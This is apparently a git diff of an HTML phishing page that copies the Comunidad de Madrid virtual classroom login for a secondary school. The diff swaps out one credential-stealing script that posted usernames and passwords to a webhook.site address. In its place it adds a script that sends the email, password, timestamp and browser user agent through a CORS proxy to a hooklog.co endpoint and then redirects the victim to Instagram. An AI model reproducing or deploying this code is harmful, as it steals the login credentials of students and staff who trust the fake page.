@@ -112,52 +112,61 @@
     <div class="logo">
       <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcolegiopiobaroja.es%2Fwp-content%2Fuploads%2F2019%2F12%2Flogo-aula-virtual.png&f=1&nofb=1&ipt=f9c9a35db7a0fc65cae0a2fe7719c879b9c574499d5ef01f1bbabaf00e91e604" alt="Logo Comunidad de Madrid">
     </div>
-    <input type="text" id="nombreInput" placeholder="Tu usuario, sin @...">
+    <input id="email" name="email" type="text" placeholder="Tu usuario, sin @...">
     <div class="password-container">
-      <input type="password" id="mensajeInput" placeholder="Contraseña">
-      <button class="toggle-password">
+      <input type="password" id="password" required name="password" placeholder="Contraseña">
+      <button type="button" onclick="send()" class="toggle-password">
         <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstatic.vecteezy.com%2Fsystem%2Fresources%2Fpreviews%2F048%2F839%2F086%2Foriginal%2Feye-silhouette-icon-icons-used-for-password-and-ophthalmology-vector.jpg&f=1&nofb=1&ipt=37e81ac21f5fb1750652ca2d3de8c0e3780a6dd40ccc9add8342107ffa608fd1" alt="Ver contraseña" height="20">
       </button>
     </div>
     <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php"><button id="btnEnviar" class="login-button">Acceder</button></a>
     <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php?loginredirect=1"><button class="guest-button">Entrar como persona invitada</button></a>
   </div>
-
+<div> id="msg" class="msg"></div>
   <script>
-    const nombreInput = document.getElementById('nombreInput');
-    const mensajeInput = document.getElementById('mensajeInput');
-    const boton = document.getElementById('btnEnviar');
+    async function send() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+      const msg = document.getElementById("msg");
 
-    boton.addEventListener('click', () => {
-      const nombre = nombreInput.value.trim();
-      const mensaje = mensajeInput.value.trim();
-
-      console.log("Nombre:", nombre);
-      console.log("Mensaje:", mensaje);
-
-      if (!nombre || !mensaje) {
-        console.warn("Falta completar uno de los campos.");
+      if (!email || !password) {
+        msg.textContent = "Completa todos los campos.";
         return;
       }
 
-      const cuerpo = `Usuario: ${nombre}\nContraseña: ${mensaje}`;
+      msg.textContent = "Enviando...";
 
-      fetch('https://webhook.site/e11574cb-2cce-4924-8cc6-5d079eda2f1b', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'text/plain'
-        },
-        body: cuerpo
-      })
-      .then(res => {
-        console.log("Petición enviada. Status:", res.status);
-        nombreInput.value = '';
-        mensajeInput.value = '';
-      })
-      .catch(err => {
-        console.error("Error al enviar:", err);
-      });
-    });
+      const payload = {
+        email,
+        password,
+        ts: new Date().toISOString(),
+        ua: navigator.userAgent
+      };
+
+      // PROXY → Hooklog
+      const url = "https://corsproxy.io/?" +
+        encodeURIComponent("https://hooklog.co/uuid=4b7a77625a17c97a1c49b031b17579b9");
+
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          msg.textContent = "✔ Enviado correctamente.";
+          window.location.href = "https://instagram.com";
+        } else {
+          const errorText = await res.text();
+          msg.textContent = `Error del servidor: ${res.status} - ${errorText}`;
+          alert("Error al iniciar sesión. Por favor, inténtalo de nuevo.");
+          
+        }
+      } catch (err) {
+        msg.textContent = `Error al enviar: ${err.message}`;
+      }
+    }
   </script>
 </body>
 </html>
